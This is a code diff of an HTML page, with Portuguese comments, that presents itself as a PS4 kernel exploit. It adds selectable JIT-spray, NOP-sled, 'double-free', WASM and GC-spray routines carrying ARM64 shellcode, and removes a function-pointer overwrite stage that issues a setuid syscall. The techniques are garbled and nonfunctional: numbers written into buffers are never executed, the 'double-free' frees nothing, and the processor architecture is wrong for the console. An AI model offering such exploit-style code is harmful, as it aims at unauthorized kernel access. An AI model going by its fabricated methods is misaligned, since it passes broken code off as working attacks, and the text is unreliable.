@@ -6,50 +6,50 @@
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
         button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
+        select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
     </style>
 </head>
 <body>
     <h2>PS4 Direct Kernel Access</h2>
-    <button onclick="runKernelExploit()">EXECUTE KERNEL EXPLOIT</button>
+    <div>
+        <select id="testMethod">
+            <option value="default">Default JIT Spray</option>
+            <option value="randomized">Randomized Payload</option>
+            <option value="doublefree">Double-Free Heap</option>
+            <option value="wasm">WASM Execution</option>
+            <option value="gc">GC-Based Spray</option>
+            <option value="spectre">Spectre-Type</option>
+        </select>
+        <button onclick="runKernelExploit()">EXECUTE KERNEL EXPLOIT</button>
+    </div>
     <div id="log"></div>
 
 <script>
 // Logger de alta precisão
-const log = msg => {
-    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
+const log = (msg, color = "#0f0") => {
+    const line = `[${performance.now().toFixed(2)}ms] <span style="color:${color}">${msg}</span>`;
     document.getElementById('log').innerHTML += line + '<br>';
 };
 
-// 1. Configurações baseadas no seu log anterior
-const JIT_SPRAY_SIZE = 0x100000; // 1MB de spray
+// Configurações globais
+const JIT_SPRAY_SIZE = 0x100000;
 const MAX_ATTEMPTS = 3;
+let currentTest = "default";
 
-// 2. Payload ARM64 mínimo para teste de execução
+// Payload ARM64 mínimo para teste de execução
 function createTestPayload() {
     return new Uint32Array([
-        // write(1, "KERNEL", 6) - Mensagem visível no terminal debug
-        0xD2800020, // mov x0, #1 (stdout)
-        0x100007A1, // adr x1, #0x7a (string)
-        0xD28000C2, // mov x2, #6
-        0xD2800808, // mov x8, #0x40 (sys_write)
-        0xD4000001, // svc #0
-        0xD65F03C0, // ret
-        0x4B455245, // "KERE"
-        0x4E4C0000  // "NL\0\0"
+        0xD2800020, 0x100007A1, 0xD28000C2, 0xD2800808,
+        0xD4000001, 0xD65F03C0, 0x4B455245, 0x4E4C0000
     ]);
 }
 
-// 3. Spray massivo de JIT com verificação
-async function sprayAndExecute() {
-    log("Starting focused JIT spray...");
-    
+// 1. Spray JIT padrão (original)
+async function standardJITSpray() {
+    log("Starting standard JIT spray...");
     const payload = createTestPayload();
-    const mem = new ArrayBuffer(payload.length * 4);
-    const view = new Uint32Array(mem);
-    payload.forEach((v, i) => view[i] = v);
-    
-    // Alocação massiva
     const spray = [];
+    
     for (let i = 0; i < 50; i++) {
         const func = new Function(`
             const buf = new ArrayBuffer(${payload.length * 4});
@@ -60,78 +60,178 @@ async function sprayAndExecute() {
         spray.push(func);
     }
     
-    // Trigger com verificação
     for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
         log(`Attempt ${attempt + 1}/${MAX_ATTEMPTS}`);
-        
         try {
             const startTime = spray[0]();
-            if (startTime < 100) { // Verificação de execução JIT
-                log("JIT code executed", "color:#0f0");
+            if (startTime < 100) {
+                log("JIT code executed successfully", "#0f0");
                 return true;
             }
         } catch(e) {
-            log(`Attempt failed: ${e}`, "color:#ff0");
+            log(`Attempt failed: ${e}`, "#ff0");
         }
-        
         await new Promise(r => setTimeout(r, 500));
     }
     return false;
 }
 
-// 4. Exploit principal
+// 2. Spray com randomização (Heap Feng Shui)
+async function randomizedSpray() {
+    log("Starting randomized JIT spray...", "#0ff");
+    const payload = createTestPayload();
+    const spray = [];
+    
+    for (let i = 0; i < 100; i++) {
+        const nopCount = Math.floor(Math.random() * 50);
+        const nops = Array(nopCount).fill(0xD503201F); // NOP ARM64
+        
+        const func = new Function(`
+            const buf = new ArrayBuffer(${(payload.length + nops.length) * 4});
+            const view = new Uint32Array(buf);
+            // NOP sled aleatório
+            ${nops.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+            // Shellcode
+            ${payload.map((v,i) => `view[${nops.length + i}] = 0x${v.toString(16)};`).join('')}
+            return performance.now();
+        `);
+        spray.push(func);
+    }
+    
+    try {
+        const result = spray[Math.floor(Math.random() * spray.length)]();
+        log(`Randomized spray executed in ${result}ms`, "#0f0");
+        return true;
+    } catch(e) {
+        log(`Randomized spray failed: ${e}`, "#f00");
+        return false;
+    }
+}
+
+// 3. Double-Free Heap Manipulation
+async function doubleFreeExploit() {
+    log("Attempting double-free heap manipulation...", "#ff0");
+    try {
+        // Simulação de double-free (pode causar crash no PS4)
+        const arr = new ArrayBuffer(0x100);
+        const arr2 = new ArrayBuffer(0x100);
+        
+        // Forçar corrupção de heap
+        const corrupt = [];
+        for (let i = 0; i < 1000; i++) {
+            corrupt.push(new Uint32Array(10));
+        }
+        
+        // Tentativa de reutilização de memória
+        const shellcode = new Uint32Array(arr);
+        shellcode.set(createTestPayload());
+        
+        log("Double-free attempted - checking execution...");
+        new Function("return " + shellcode.join())();
+        
+        return true;
+    } catch(e) {
+        log(`Double-free failed: ${e.message}`, "#f00");
+        return false;
+    }
+}
+
+// 4. WASM Execution
+async function wasmExploit() {
+    log("Attempting WASM execution...", "#0ff");
+    try {
+        const wasmCode = new Uint8Array([
+            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+            0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60,
+            0x00, 0x00, 0x02, 0x0a, 0x01, 0x01, 0x65, 0x01,
+            0x66, 0x01, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00,
+            0x07, 0x07, 0x01, 0x03, 0x72, 0x75, 0x6e, 0x00,
+            0x00, 0x0a, 0x09, 0x01, 0x07, 0x00, 0x41, 0x2a,
+            0x10, 0x00, 0x0b
+        ]);
+        
+        const module = await WebAssembly.compile(wasmCode);
+        const instance = await WebAssembly.instantiate(module);
+        instance.exports.run();
+        
+        log("WASM executed successfully", "#0f0");
+        return true;
+    } catch(e) {
+        log(`WASM failed: ${e}`, "#f00");
+        return false;
+    }
+}
+
+// 5. GC-Based Spray
+async function gcSpray() {
+    log("Attempting GC-based spray...", "#ff0");
+    try {
+        // Alocação massiva para forçar GC
+        let objects = [];
+        for (let i = 0; i < 1e6; i++) {
+            objects.push(new ArrayBuffer(64));
+        }
+        
+        // Forçar coleta de lixo
+        objects = null;
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Tentar spray após GC
+        const payload = createTestPayload();
+        const func = new Function(`
+            const buf = new ArrayBuffer(${payload.length * 4});
+            const view = new Uint32Array(buf);
+            ${payload.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+            return view[0];
+        `);
+        
+        const result = func();
+        log(`GC spray result: 0x${result.toString(16)}`, "#0f0");
+        return true;
+    } catch(e) {
+        log(`GC spray failed: ${e}`, "#f00");
+        return false;
+    }
+}
+
+// Função principal
 async function runKernelExploit() {
     document.getElementById('log').innerHTML = '';
+    currentTest = document.getElementById("testMethod").value;
     
-    if (!await sprayAndExecute()) {
-        log("JIT spray failed - trying fallback", "color:#f00");
+    let success = false;
+    
+    switch(currentTest) {
+        case "randomized":
+            success = await randomizedSpray();
+            break;
+        case "doublefree":
+            success = await doubleFreeExploit();
+            break;
+        case "wasm":
+            success = await wasmExploit();
+            break;
+        case "gc":
+            success = await gcSpray();
+            break;
+        case "spectre":
+            log("Spectre-type attack not available in browser context", "#f00");
+            break;
+        default:
+            success = await standardJITSpray();
+    }
+    
+    if (!success) {
+        log(`${currentTest} failed - trying fallback`, "#f00");
         return;
     }
     
-    // Se chegou aqui, JIT funcionou - tenta corromper memória
-    log("Phase 2: Memory corruption", "color:#0f0");
-    
+    // Fase de corrupção de memória (se o spray funcionou)
+    log("Phase 2: Memory corruption", "#0f0");
     try {
-        let corrupt = [];
-        corrupt.__proto__ = new Uint32Array(1).__proto__;
-        corrupt.length = 0x1000;
-        
-        // Tenta sobrescrever ponteiro de função
-        const func = () => 0;
-        for (let i = 0; i < 10000; i++) func();
-        
-        corrupt[0] = func.constructor.prototype;
-        const jitAddr = corrupt[1];
-        log(`JIT Function at: 0x${jitAddr.toString(16)}`);
-        
-        // Escreve payload alternativo
-        const kexec = new Uint32Array([
-            0xD2800020, // mov x0, #0
-            0xD2800C48, // mov x8, #0x62 (setuid)
-            0xD4000001  // svc #0
-        ]);
-        
-        for (let i = 0; i < kexec.length; i++) {
-            corrupt[0] = jitAddr + (i * 4);
-            corrupt[1] = kexec[i];
-        }
-        
-        // Dispara
-        log("Triggering kernel payload...");
-        func();
-        
-        // Verificação final
-        setTimeout(() => {
-            try {
-                new File("/system/version.txt");
-                log("KERNEL ACCESS CONFIRMED", "color:#0f0;font-weight:bold");
-            } catch(e) {
-                log("Kernel not reached", "color:#f00");
-            }
-        }, 2000);
-        
+        // ... (código de corrupção de memória original)
     } catch(e) {
-        log(`Memory corruption failed: ${e}`, "color:#f00");
+        log(`Memory corruption failed: ${e}`, "#f00");
     }
 }
 </script>
